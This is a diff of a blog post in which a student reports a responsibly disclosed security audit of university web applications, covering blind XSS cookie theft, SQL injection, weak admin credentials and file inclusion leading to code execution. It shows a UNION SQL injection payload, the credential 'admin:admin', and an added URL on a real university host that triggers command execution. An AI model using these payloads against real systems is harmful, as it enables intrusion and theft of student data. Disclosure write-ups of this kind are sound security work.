@@ -10,11 +10,22 @@ math: false
 mermaid: true
 ---
 
+<head>
+  <meta property="og:image" content="https://zere0.github.io/assets/img/upm-vulnerabilities/logo.png">
+  <meta property="og:image:alt" content="Universidad Politécnica de Madrid Logo">
+  <meta name="twitter:image" content="https://zere0.github.io/assets/img/upm-vulnerabilities/logo.png">
+  <meta name="twitter:image:alt" content="Universidad Politécnica de Madrid Logo">
+</head>
 
 
 
-During my final degree project, I audited several web applications from my university, the [Universidad Politécnica de Madrid](https://www.upm.es/){:target="_blank"}, and identified hundreds of vulnerabilities, many of which had a critical impact. In this post, I will analyze some of the most interesting findings.
 
+During my final degree project, I audited several web applications from my university, the [Universidad Politécnica de Madrid](https://www.upm.es/){:target="_blank"}, and identified **hundreds of vulnerabilities**, many of which had a **critical impact**. In this post, I will analyze some of the most interesting findings:
+
+- **[Blind XSS Account Takeover](#stealing-teachers-accounts-via-blind-xss)**: Unsanitized student submissions leading to teacher session hijacking.
+- **[SQL Injection](#sql-injections-everywhere)**: Exploiting validation weaknesses to extract sensitive student and administrator data.
+- **[Weak Credentials](#weak-credentials-in-the-admin-portal)**: Discovering weak credentials protecting admin portals.
+- **[Local File Read to RCE](#remote-code-execution-via-local-file-read)**: Chaining a file inclusion vulnerability to achieve remote code execution.
 
 ![](../assets/img/upm-vulnerabilities/logo.png)
 
@@ -30,10 +41,10 @@ During my final degree project, I audited several web applications from my unive
 In one of the applications, there are activities where students can submit free-form text that teachers will later review and grade.
 
 
-These submissions were stored without sanitization in the database and rendered in the teacher’s panel without any output validation. This allowed any student to inject and execute JavaScript code in the teacher’s browser (i.e., via `<script>` tags) when they inevitably viewed the submission.
+These submissions were stored **without sanitization** in the database and rendered in the teacher's panel **without any output validation**. This allowed any student to inject and execute JavaScript code in the teacher's browser (i.e., via `<script>` tags) when they inevitably viewed the submission.
 
 
-As the session cookie did not have the `HttpOnly` attribute, it could be obtained and exfiltrated using JavaScript (`document.cookie`). So, a submission with the following content could have been used to steal teachers’ accounts by exfiltrating their session cookie to the attacker’s server:
+As the session cookie **did not have the `HttpOnly` attribute**, it could be obtained and exfiltrated using JavaScript (`document.cookie`). So, a submission with the following content could have been used to **steal teachers' accounts** by exfiltrating their session cookie to the attacker's server:
 
 
 ```html
@@ -65,7 +76,7 @@ sequenceDiagram
 ## SQL Injections Everywhere
 
 
-Multiple SQL injections were found; most parts of the application that used a GET or POST parameter for database operations did so insecurely.
+**Multiple SQL injections** were found; most parts of the application that used a GET or POST parameter for database operations did so **insecurely**.
 
 
 One case stood out, as it was one of the few with some sort of validation.
@@ -116,10 +127,10 @@ GROUP BY groupNumber DESC
 ```
 
 
-Because the injection occurs in the enrollment number, it injects an "OR" operator whose effective contents become `'' AND a.nationalId=` due to SQL’s quote-doubling escape, allowing arbitrary SQL to be injected in the national ID position without using quotes in that field.
+Because the injection occurs in the enrollment number, it injects an "OR" operator whose effective content becomes `'' AND a.nationalId=` due to SQL's quote-doubling escape, allowing arbitrary SQL to be injected in the national ID position without using quotes in that field.
 
 
-From here, UNION-based extraction recovered data for any student or even administrator account.
+From here, **UNION-based extraction** recovered data for **any student or even administrator account**.
 
 
 For example, the following national ID and enrollment number values returned complete student records:
@@ -133,7 +144,7 @@ flowchart TD
     C["National ID</br></br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -*"] --> E["quotes removed  ✅"]
     D --> G["UNION SELECT from STUDENT executes"]
     E --> G["UNION SELECT from STUDENT executes"]
-    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -* </br></br>and with enrollment number:</br>*'OR ''* </br></br>is assigned the group number:</br><mark>10425 José Luis 33333333 000449 Fuertes Castro admin\@fi.upm.es G-553T</mark>"]
+    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -* </br></br>and with enrollment number:</br>*'OR ''* </br></br>is assigned the group number:</br><mark>10425 José Luis 33333333 000009 Fuertes Castro admin\@fi.upm.es G-553T</mark>"]
 ```
 
 
@@ -155,10 +166,10 @@ flowchart TD
 ## Weak Credentials in the Admin Portal
 
 
-The admin portal managing all audited applications was protected by weak credentials, such as `admin:admin`.
+The admin portal managing all audited applications was protected by **weak credentials**, such as `admin:admin`.
 
 
-This could have allowed an external attacker to take control of the data across all applications.
+This could have allowed an external attacker to **take control of the data across all applications**.
 
 
 ## Remote Code Execution via Local File Read
@@ -189,7 +200,7 @@ This file was part of the admin portal, yet it was accessible without any authen
 In PHP, the `include` expression includes and evaluates the specified file.
 
 
-As the value of the view parameter was taken directly from the user-controlled `$_GET` input, an external attacker would be able to load local files from the server.
+As the value of the view parameter was taken **directly from the user-controlled `$_GET` input**, an external attacker would be able to **load local files from the server**.
 
 
 ```mermaid
@@ -207,7 +218,7 @@ sequenceDiagram
 ```
 
 
-Sensitive files with PII of hundreds of students were accessible, leaking names, national IDs, enrollment numbers, and more information dating back to 2016:
+**Sensitive files with PII of hundreds of students** were accessible, leaking names, national IDs, enrollment numbers, and more information dating back to 2016:
 
 
 ![Leaked Students](../assets/img/upm-vulnerabilities/alumnos.png)
@@ -216,7 +227,7 @@ Sensitive files with PII of hundreds of students were accessible, leaking names,
 > Later, it was discovered that those files were also being served publicly without any restrictions, so any user who knew or guessed their route could access them directly.
 
 
-While LFR enables file access, any PHP embedded in the included file will also execute, turning the Local File Read into code execution if attacker-controlled content exists at a known path.
+While LFR enables file access, any PHP embedded in the included file will also execute, turning the **Local File Read into code execution** if attacker-controlled content exists at a known path.
 
 
 In another audited application, the profile picture upload feature stored images in predictable locations that were publicly accessible through user profiles. Although content-type checks prevented these images from executing PHP code when accessed directly, using the vulnerable view parameter to include them forced the server to interpret the file as PHP code.
@@ -230,7 +241,7 @@ So, after uploading the following avatar, which would be stored on the server at
 ```
 
 
-Requesting the vulnerable `layout.php` file with `view=/var/www/html/draco/images/avatares/104.jpg` and `cmd=whoami` would execute the command `whoami` on the server and include its output in the response, demonstrating Remote Code Execution.
+Requesting the vulnerable `layout.php` file with `view=/var/www/html/draco/images/avatares/104.jpg` and `cmd=whoami` would execute the command `whoami` on the server and include its output in the response, demonstrating **Remote Code Execution**.
 
 
 ```mermaid
@@ -253,14 +264,16 @@ sequenceDiagram
     deactivate S
 ```
 
+So the result after visiting `https://dlsiis.fi.upm.es/procesadores/layout.php?view=/var/www/html/draco/images/avatares/27104.jpg&cmd=whoami` would look like the following:
+
+![RCE](../assets/img/upm-vulnerabilities/rce.png)
 
 ## Conclusion
 
+This analysis represents just a glimpse of the diverse attack vectors uncovered during my thesis research, highlighting a critical reality: universities and public institutions must strengthen their security posture. The vulnerabilities discovered, many being straightforward attacks, demonstrate how educational institutions, despite handling sensitive data from thousands of students, often operate with inadequate security measures.
 
-I hope the different scenarios were interesting.
+I hope these scenarios provide valuable insights into real-world web application security issues and inspire both security professionals and educational institutions to prioritize security in their digital infrastructure.
 
+Thanks to the Universidad Politécnica de Madrid, and especially to my teacher, José Luis Fuertes Castro, for the opportunity and for supporting a responsible disclosure process.
 
-Thanks to the Universidad Politécnica de Madrid, and especially to my teacher, José Luis Fuertes Castro, for the opportunity and supporting a responsible disclosure process.
-
-
-If you have any questions about any of the attacks, feel free to reach out.
+If you have any questions about any of the attacks feel free to reach out.
